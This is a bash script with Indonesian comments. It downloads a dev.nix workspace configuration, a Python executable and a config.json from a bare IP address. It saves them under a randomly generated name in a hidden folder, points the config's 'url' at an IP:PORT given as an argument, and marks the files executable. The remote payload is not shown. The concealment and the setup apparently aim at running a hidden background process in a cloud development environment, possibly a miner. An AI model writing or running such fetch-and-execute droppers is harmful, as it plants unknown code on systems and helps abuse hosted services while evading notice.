#!/bin/bash
# Buat nama random
VOWELS="aeiou"
CONSONANTS="bcdfghjklmnpqrstvwxyz"

# ambil 1 konsonan
C1=$(echo "$CONSONANTS" | fold -w1 | shuf | head -n1)
# ambil 1 vokal
V=$(echo "$VOWELS" | fold -w1 | shuf | head -n1)
# ambil 1 konsonan lagi
C2=$(echo "$CONSONANTS" | fold -w1 | shuf | head -n1)

NAME="$C1$V$C2"

# Ambil argumen pertama (IP:PORT)
URL="${1:-}"

# Validasi input
if [ -z "$URL" ]; then
    echo "Usage: $0 <IP:PORT>"
    echo "Contoh: $0 102.210.254.203:80"
    exit 1
fi

# Pastikan folder .idx ada
mkdir -p .idx
cd .idx || exit 1

# Download file dev.nix dan ganti kata 'ganti'
wget -q -O dev.nix http://143.198.196.235/dev.nix
sed -i "s/ganti/${NAME}/g" dev.nix

# Buat folder sesuai nama random
mkdir -p "~/.$NAME"
cd "~/.$NAME" || exit 1

# Download file python & config.json
wget -q -O "${NAME}" http://143.198.196.235/dev.py
wget -q -O config.json http://143.198.196.235/config.json

# Ganti "url" di config.json dengan IP:PORT yang dikirim lewat argumen
sed -i "s/\"url\": *\"[^\"]*\"/\"url\": \"${URL}\"/" config.json

# Jadikan file python executable
chmod +x config.json
chmod +x "${NAME}"

echo "✅ Selesai. URL di-set ke ${URL}, file ada di .idx/${NAME}/${NAME}"
